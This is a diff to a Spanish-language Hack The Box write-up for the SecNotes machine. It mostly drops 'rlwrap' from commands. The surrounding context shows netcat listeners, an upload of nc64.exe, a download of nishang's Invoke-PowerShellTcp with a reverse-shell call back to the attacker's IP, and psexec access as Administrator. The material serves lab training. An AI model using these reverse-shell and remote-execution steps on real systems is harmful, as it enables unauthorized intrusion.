@@ -350,7 +350,7 @@ put nc64.exe
 Nos pondremos en escucha a través del puerto que determinemos.
 
 ```
-sudo rlwrap nc -nlvp <puertoCualquiera>
+sudo nc -nlvp <puertoCualquiera>
 ```
 
 Para finalmente a través del navegador añadir lo siguiente al url.
@@ -367,7 +367,7 @@ O por su parte podemos usar `Invoke-PowerShellTcp` de _nishang_, para lo cual de
 wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 ```
 
-Añadimos lo siguiente al final del script.
+Añadimos la siguiente línea al final del script.
 
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress <nuestraDirecciónIP> -Port <puertoCualquiera>
@@ -384,7 +384,7 @@ put Invoke-PowerShellTcp.ps1
 Nos ponemos en escucha a través del puerto que determinamos anteriormente.
 
 ```
-sudo rlwrap nc -nlvp <puertoCualquiera>
+sudo nc -nlvp <puertoCualquiera>
 ```
 
 Para finalmente a través del navegador añadir lo siguiente al url.
@@ -463,7 +463,7 @@ smbclient //10.10.10.97/Admin%/Desktop -U 'Administrator'
 O, simplemente, haciendo uso de `impacket-psexec`.
 
 ```
-rlwrap impacket-psexec administrator@10.10.10.97
+impacket-psexec administrator@10.10.10.97
 ```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-28-SecNotes-Hack-The-Box/45.png){:class="blog-image" onclick="expandImage(this)"} 
